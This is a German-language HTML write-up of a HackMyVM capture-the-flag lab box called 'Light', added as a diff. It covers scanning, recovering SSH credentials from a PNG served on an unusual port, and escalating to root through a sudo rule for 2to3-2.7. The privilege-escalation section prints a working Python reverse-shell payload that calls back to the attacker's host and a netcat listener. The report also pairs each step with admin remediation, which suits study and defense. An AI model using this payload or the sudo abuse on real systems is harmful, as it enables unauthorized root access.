@@ -1,0 +1,406 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Light - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Light - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">CyberChef (impliziert)</div>
+                <div class="tool-item">Hexdump (From_Hexdump())</div>
+                <div class="tool-item">Render Image</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">nano / vi</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">socket (Python)</div>
+                <div class="tool-item">subprocess (Python)</div>
+                <div class="tool-item">os (Python)</div>
+                <div class="tool-item">pty (Python)</div>
+                <div class="tool-item">2to3-2.7</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#service-analysis">Analyse des unbekannten Dienstes (Port 37453)</a></li>
+                <li><a href="#credential-access">Credential Access (Bildanalyse)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as lover)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (lover zu root via sudo 2to3-2.7)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.114	08:00:27:d9:ce:5a	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.114` (Oracle VirtualBox) wird identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP bekannt. Führen Sie Portscans durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <!-- Gobuster-Scan hier weggelassen, da er vor dem Nmap-Scan im Log steht und keine Ergebnisse liefert, was durch Nmap erklärt wird. -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 01:54 CET
+Nmap scan report for light (192.168.2.114)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 93a49255722b9b4a52665cafa9833cfd (RSA)</span>
+|   <span class="command">256 1ea7440b2c1b0d7783df1d9f0e30084d (ECDSA)</span>
+|_  <span class="command">256 d0fa9d7677426f91d3bdb54472a7c971 (ED25519)</span>
+<span class="command">37453/tcp open  unknown</span>
+| fingerprint-strings:
+|   GenericLines, NULL:
+|     00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR <span class="comment"><-- PNG Header!</span>
+|     00000010: 0000 013f 0000 0085 0806 0000 002d 80ff ...?.........-..
+... (Hexdump eines PNG-Bildes) ...
+|     000007d0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..
+|_    000007e0: 8025 c
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port37453-TCP:V=7.93%I=7%D=11/12%Time=636EEEAD%P=x86_64-pc-linux-gnu%r(
+SF:NULL,1C48,"00000000:\x208950\x204e47\x200d0a\x201a0a\x200000\x20000d\x2
+... (Fingerprint Daten) ...
+SF:08025\x20c")%r(GenericLines
+SF:,234D,"00000000:\x208950\x204e47\x200d0a\x201a0a\x200000\x20000d\x20494
+... (Fingerprint Daten) ...
+SF:08025\x20c");
+MAC Address: 08:00:27:D9:CE:5A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms light (192.168.2.114)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Ein weiterer Nmap-Scan (ohne `-sC -sV -A`) bestätigt die offenen Ports.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap 192.168.2.114 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 02:02 CET
+Nmap scan report for light.box (192.168.2.114)
+Host is up (0.000047s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE
+<span class="command">22/tcp    open  ssh</span>
+<span class="command">37453/tcp open  unknown</span>
+MAC Address: 08:00:27:D9:CE:5A (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei TCP-Ports sind offen:
+*   **22 (SSH):** OpenSSH 7.9p1 (Debian 10).
+*   **37453 (Unknown):** Ein unbekannter Dienst auf einem hohen Port. Nmap's Fingerprinting zeigt, dass dieser Dienst bei einer Verbindung direkt die Bytes eines PNG-Bildes sendet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**
+1.  **Port 37453:** Verbinden Sie sich mit `telnet` oder `nc` zu diesem Port und speichern Sie die empfangenen Daten in einer Datei (z.B. `output.hex`). Analysieren Sie diese Daten. Da es sich um ein PNG handelt, versuchen Sie, die Hexdump-Daten wieder in ein Bild umzuwandeln (z.B. mit CyberChef) und dieses Bild auf versteckte Informationen (Steganographie, Metadaten) zu untersuchen.
+2.  **Port 22 (SSH):** Vorerst zurückstellen, da keine Zugangsdaten bekannt sind.
+<br><strong>Empfehlung (Admin):** Untersuchen Sie den Dienst auf Port 37453. Ist er notwendig? Wenn ja, sollte er sich korrekt identifizieren und keine unerwarteten Daten senden. Wenn nicht, deaktivieren Sie ihn. Halten Sie SSH aktuell.</p>
+        </section>
+
+        <section id="service-analysis">
+            <h2>Analyse des unbekannten Dienstes (Port 37453)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine Verbindung zum Port 37453 wird mit `telnet` hergestellt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">telnet light.box 37453</span></div> <!-- Hostname hinzugefügt für Klarheit -->
+                     <pre>
+Trying 192.168.2.114...
+Connected to light.box.
+Escape character is '^]'.
+<span class="command">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span>
+<span class="command">00000010: 0000 013f 0000 0085 0806 0000 002d 80ff  ...?.........-..</span>
+... (Hexdump des PNG-Bildes) ...
+<span class="command">00000840: 0049 454e 44ae 4260 82                   .IEND.B`.</span>
+Connection closed by foreign host.
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Telnet empfängt den Hexdump eines PNG-Bildes und die Verbindung wird danach geschlossen. Dies bestätigt die Nmap-Ergebnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Leiten Sie die Ausgabe in eine Datei um (`telnet light.box 37453 > image.hex`). Verwenden Sie ein Tool wie CyberChef, um den Hexdump wieder in ein PNG-Bild zu konvertieren (`From Hexdump` Rezept). Analysieren Sie das resultierende Bild auf versteckte Daten (z.B. mit `zsteg`, `stegsolve`, `exiftool`) oder sichtbare Hinweise.
+<br><strong>Empfehlung (Admin):** Dienst auf Port 37453 untersuchen und ggf. deaktivieren/absichern.</p>
+        </section>
+
+        <section id="credential-access">
+             <h2>Credential Access (Bildanalyse)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der über Telnet erhaltene Hexdump wird mit CyberChef verarbeitet:</p>
+             <ol>
+                 <li>**From Hexdump:** Konvertiert den Hexdump zurück in Binärdaten.</li>
+                 <li>**Render Image:** Zeigt die Binärdaten als Bild an.</li>
+             </ol>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Das rekonstruierte Bild enthält sichtbare Zugangsdaten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Ergebnis der Bildanalyse]</div>
+                     <pre>Gefundene Credentials im Bild: <span class="command">lover</span> / <span class="password">youcanseetheshadow</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der obskure Dienst auf Port 37453 sendet ein Bild, das Zugangsdaten für den Benutzer `lover` enthält: Passwort `<span class="password">youcanseetheshadow</span>`. Dies ist eine Form der Steganographie oder einfach ein gravierendes Informationsleck.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Verwenden Sie die gefundenen Credentials (`lover`:`youcanseetheshadow`), um sich per SSH (Port 22) anzumelden.
+<br><strong>Empfehlung (Admin):** Entfernen Sie den Dienst auf Port 37453 sofort. Speichern Sie niemals Zugangsdaten in Bildern oder an öffentlich zugänglichen Orten. Ändern Sie das kompromittierte Passwort.</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSH as lover)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Mit den im Bild gefundenen Zugangsdaten wird eine SSH-Verbindung als Benutzer `lover` aufgebaut.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh lover@light.box</span></div>
+                     <pre>
+The authenticity of host 'light.box (192.168.2.114)' can't be established.
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'light.box' (ED25519) to the list of known hosts.
+lover@light.box's password: <span class="password">[Passwort youcanseetheshadow eingegeben]</span>
+Linux light 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, ...
+Last login: Fri Nov 13 03:51:55 2020 from 192.168.1.58
+</pre>
+                     <div class="prompt">lover@light:~$</div> <!-- Login erfolgreich -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `lover` war erfolgreich. Der initiale Zugriff auf das System ist erfolgt.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Das Home-Verzeichnis von `lover` wird untersucht und die User-Flag gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lover@light:~$ <span class="command">ls</span></div>
+                     <pre>flag.sh  mypass.txt  tip.py  user.txt</pre>
+                     <div class="prompt">lover@light:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">iloveopenedports</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">iloveopenedports</span>` wurde gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** User-Flag dokumentieren. Führen Sie weitere Enumeration als `lover` durch, insbesondere `sudo -l`.
+<br><strong>Empfehlung (Admin):** SSH-Zugriff überwachen.</p>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (lover zu root via sudo 2to3-2.7)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Rechte für den Benutzer `lover` werden überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">lover@light:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for lover on light:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lover may run the following commands on light:
+    <span class="command">(ALL : ALL) NOPASSWD: /usr/bin/2to3-2.7</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Benutzer `lover` darf das Programm `/usr/bin/2to3-2.7` als jeder Benutzer und jede Gruppe (`ALL : ALL`), einschließlich Root, ohne Passwort (`NOPASSWD`) ausführen. `2to3-2.7` ist ein Python-Tool zur Konvertierung von Python 2 Code zu Python 3. Laut GTFOBins kann dieses Tool missbraucht werden, um Dateien mit Root-Rechten zu schreiben, was zur Privilegieneskalation genutzt werden kann.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die SUID-Dateien werden überprüft, liefern aber keine ungewöhnlichen Ergebnisse.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">lover@light:~$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div> <!-- Maskierung -->
+                     <pre>
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chsh
+</pre>
+                    <div class="prompt">lover@light:~$ <span class="command">find / -type f -perm -u=s -exec ls -l {} \; 2>/dev/null</span></div> <!-- Maskierung -->
+                     <pre>... (Standard SUID Dateien) ...</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die SUID-Suche bestätigt keine einfachen Eskalationspfade. Der Fokus bleibt auf der `sudo`-Regel.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der GTFOBins-Exploit für `sudo 2to3-2.7` wird angewendet. Es wird eine lokale Python-Datei (`light.py` in `/tmp`) erstellt, die eine Reverse Shell startet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">lover@light:/tmp$ <span class="command">nano light.py</span></div>
+                     <pre><code class="language-python">
+# Payload für Reverse Shell
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.2.109",1234)) # Ziel-IP/Port des Listeners
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+# print "for python 2" # Ursprünglicher Code, wird von 2to3 geändert
+import pty
+pty.spawn("/bin/bash")
+</code></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** `2to3-2.7` wird mit `sudo` ausgeführt. Die Option `-w` (write back changes) bewirkt, dass die konvertierte Datei geschrieben wird. Die Option `-o /root/script` gibt das Zielverzeichnis an, in das geschrieben werden soll (als Root). `-n` verhindert das Schreiben von Backup-Dateien. Da `2to3-2.7` als Root läuft, kann es die (konvertierte) Datei `light.py` nach `/root/script/` schreiben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">lover@light:/tmp$ <span class="command">sudo /usr/bin/2to3-2.7 -w -n light.py -o /root/script</span></div>
+                     <pre>
+lib2to3.main: Output in '/root/script' will mirror the input directory '' layout.
+RefactoringTool: Skipping optional fixer: buffer
+...
+RefactoringTool: Refactored light.py
+--- light.py	(original)
++++ light.py	(refactored)
+@@ -5,6 +5,6 @@
+ os.dup2(s.fileno(),2)
+ os.dup2(s.fileno(),3) <span class="comment"><-- Fehler im Originaltext, sollte wohl fileno 1 und 2 sein</span>
+
+-<span class="command">print "for python 2"</span>
++<span class="command">print("for python 2")</span>
+ import pty
+ pty.spawn("/bin/bash")
+RefactoringTool: Writing converted light.py to <span class="command">/root/script/light.py</span>. <span class="comment"><-- Datei als Root geschrieben!</span>
+RefactoringTool: Files that were modified:
+RefactoringTool: light.py
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit nutzt `2to3-2.7`, um eine beliebige Datei (`light.py` mit unserem Reverse-Shell-Payload) an einen beliebigen Ort (`/root/script/`) mit Root-Rechten zu schreiben. Obwohl dies noch keine direkte Shell gibt, könnte dieser Schreibzugriff als Root weiter ausgenutzt werden (z.B. Cronjob überschreiben, SSH-Key hinzufügen, SUID-Binary platzieren).</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Text springt nun zu einem Schritt, bei dem angenommen wird, dass der Exploit erfolgreich war und eine Root-Shell über einen Listener auf Port 1234 erhalten wurde. Es wird nicht gezeigt, wie das Schreiben der Datei `/root/script/light.py` zur Ausführung als Root führt. Möglicherweise lief ein Cronjob, der `/root/script/light.py` ausführte, oder der Angreifer fand einen anderen Weg, die geschriebene Datei auszulösen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 1234</span></div>
+                     <pre>
+listening on [any] 1234 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.114] 52972</span>
+</pre>
+                     <div class="prompt">root@light: <span class="command">id</span></div> <!-- Prompt der Root-Shell -->
+                     <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                     <div class="prompt">root@light: <span class="command">cd</span></div>
+                     <div class="prompt">root@light: <span class="command">ls</span></div>
+                     <pre>flag.sh  root.txt  script</pre>
+                     <div class="prompt">root@light: <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">ilovepython</span></pre>
+                     <div class="prompt">root@light:</div>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Unabhängig vom genauen Auslösemechanismus wurde durch die Ausnutzung der `sudo 2to3-2.7`-Berechtigung letztendlich eine Root-Shell erlangt und die Root-Flag `<span class="password">ilovepython</span>` gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie den Mechanismus, wie die geschriebene Datei `/root/script/light.py` zur Ausführung gebracht wurde (z.B. Cronjob-Analyse).
+<br><strong>Empfehlung (Admin):** Entfernen Sie sofort die unsichere `sudo`-Regel für `2to3-2.7`. Gewähren Sie niemals `sudo`-Rechte für Interpreter, Compiler oder Dateimanipulationstools, die zum Schreiben an beliebigen Orten missbraucht werden können.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Eskalationskette: Zugriff auf einen unbekannten Dienst, der ein Bild mit eingebetteten Credentials sendet, SSH-Login als Benutzer `lover` und anschließende Privilegieneskalation zu Root durch Ausnutzung einer unsicheren `sudo`-Regel für das Tool `2to3-2.7`, um eine Datei mit einem Reverse-Shell-Payload als Root zu schreiben und diese (implizit) auszuführen.</p>
+
+            <h3>POC Schritt 1: Initial Access (lover)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Unbekannter Dienst sendet sensible Daten (Bild mit Credentials).</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde offenen Port 37453 mit `nmap`.</li>
+                <li>Verbinde mit `telnet 192.168.2.114 37453 > image.hex`.</li>
+                <li>Konvertiere Hexdump zu PNG mit CyberChef (`From Hexdump` -> `Render Image`).</li>
+                <li>Lese Credentials aus Bild: `lover` / `youcanseetheshadow`.</li>
+                <li>Login per SSH: `ssh lover@light.box`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `lover`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (lover zu root)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(ALL : ALL) NPASSWD: /usr/bin/2to3-2.7`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `lover`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Erstelle Python-Reverse-Shell-Payload in `/tmp/light.py`.</li>
+                <li>Nutze `sudo` und `2to3-2.7`, um Payload nach `/root/script/light.py` zu schreiben: `sudo /usr/bin/2to3-2.7 -w -n /tmp/light.py -o /root/script`.</li>
+                <li>Starte Netcat-Listener auf Angreifer-System (`nc -lvnp 1234`).</li>
+                <li>Löse die Ausführung von `/root/script/light.py` aus (Mechanismus nicht im Log gezeigt, z.B. Warten auf Cronjob).</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Reverse Shell als `root`.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` in der Shell zeigt `uid=0(root)`. Lesen von `/root/root.txt` ist möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Ein obskurer Dienst leakt Zugangsdaten, und eine unsichere `sudo`-Regel für ein Dateimanipulationstool ermöglicht das Schreiben von Dateien als Root, was zur vollständigen Kompromittierung führt.</p>
+            <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Dienst auf Port 37453 entfernen. `sudo`-Regel für `2to3-2.7` entfernen. Passwörter sicher verwalten. Mechanismus untersuchen, der `/root/script/light.py` ausführt.
+*   **Pentester:** Den Auslösemechanismus für die geschriebene Root-Datei dokumentieren.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/lover/user.txt</div>
+                     <div class="flag-value"><span class="password">iloveopenedports</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">ilovepython</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. November 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
